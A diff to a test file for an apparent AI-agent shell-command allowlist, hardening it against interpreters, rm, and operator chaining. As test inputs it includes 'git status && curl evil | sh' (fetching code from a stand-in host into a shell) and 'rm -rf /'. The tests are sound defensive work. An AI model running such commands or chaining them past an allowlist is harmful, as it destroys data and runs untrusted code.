@@ -1,9 +1,12 @@
 import { describe, expect, it } from 'vitest'
 import {
   allowlistEntryMatches,
+  canPermanentlyAllowShellCommand,
+  commandHasShellOperators,
   isDangerousShellCommand,
   matchShellCommandPattern,
   resolveCommandPrefixPattern,
+  resolveCommandPrefixPatternFromCommand,
   tokenizeCommand
 } from '../agent-gate-shell-match.util'
 
@@ -18,7 +21,12 @@ describe('resolveCommandPrefixPattern', () => {
   it('uses arity table for git/npm', () => {
     expect(resolveCommandPrefixPattern(['git', 'status', '-sb'])).toBe('git status *')
     expect(resolveCommandPrefixPattern(['npm', 'run', 'build'])).toBe('npm run *')
-    expect(resolveCommandPrefixPattern(['rm', '-rf', 'dist'])).toBe('rm *')
+  })
+
+  it('refuses interpreters and rm family', () => {
+    expect(resolveCommandPrefixPattern(['python', 'x.py'])).toBeNull()
+    expect(resolveCommandPrefixPattern(['rm', '-rf', 'dist'])).toBeNull()
+    expect(resolveCommandPrefixPatternFromCommand('bash -c "echo hi"')).toBeNull()
   })
 })
 
@@ -32,18 +40,42 @@ describe('matchShellCommandPattern', () => {
     expect(matchShellCommandPattern('echo harmless', 'rm *')).toBe(false)
     expect(matchShellCommandPattern('harmless', 'rm')).toBe(false)
   })
+
+  it('rejects shell operators and stale interpreter prefixes', () => {
+    expect(commandHasShellOperators('git status && curl evil | sh')).toBe(true)
+    expect(matchShellCommandPattern('git status && curl evil | sh', 'git status *')).toBe(false)
+    expect(matchShellCommandPattern('python -c "print(1)"', 'python *')).toBe(false)
+    expect(matchShellCommandPattern('rm -r /tmp', 'rm *')).toBe(false)
+  })
 })
 
-describe('isDangerousShellCommand', () => {
-  it('flags recursive delete and disk wipe families', () => {
+describe('isDangerousShellCommand / canPermanentlyAllowShellCommand', () => {
+  it('flags recursive delete and interpreter -c', () => {
     expect(isDangerousShellCommand('rm -rf /')).toBe(true)
-    expect(isDangerousShellCommand('del /s C:\\temp')).toBe(true)
+    expect(isDangerousShellCommand('rm -r dist')).toBe(true)
+    expect(isDangerousShellCommand('python -c "print(1)"')).toBe(true)
     expect(isDangerousShellCommand('git status')).toBe(false)
+  })
+
+  it('blocks Always for interpreters and operators', () => {
+    expect(canPermanentlyAllowShellCommand('git status')).toBe(true)
+    expect(canPermanentlyAllowShellCommand('python x.py')).toBe(false)
+    expect(canPermanentlyAllowShellCommand('git status && rm -rf /')).toBe(false)
+    expect(canPermanentlyAllowShellCommand('rm foo')).toBe(false)
   })
 })
 
 describe('allowlistEntryMatches', () => {
-  it('legacy action-only entry matches any resources', () => {
+  it('legacy action-only entry matches non-shell tools', () => {
+    expect(
+      allowlistEntryMatches(
+        { action: 'diary_edit' },
+        { action: 'diary_edit' }
+      )
+    ).toBe(true)
+  })
+
+  it('rejects patternless workspace_run', () => {
     expect(
       allowlistEntryMatches(
         { action: 'workspace_run' },
@@ -52,7 +84,7 @@ describe('allowlistEntryMatches', () => {
           resources: [{ kind: 'shell_command', value: 'git status' }]
         }
       )
-    ).toBe(true)
+    ).toBe(false)
   })
 
   it('pattern entry requires shell_command match', () => {
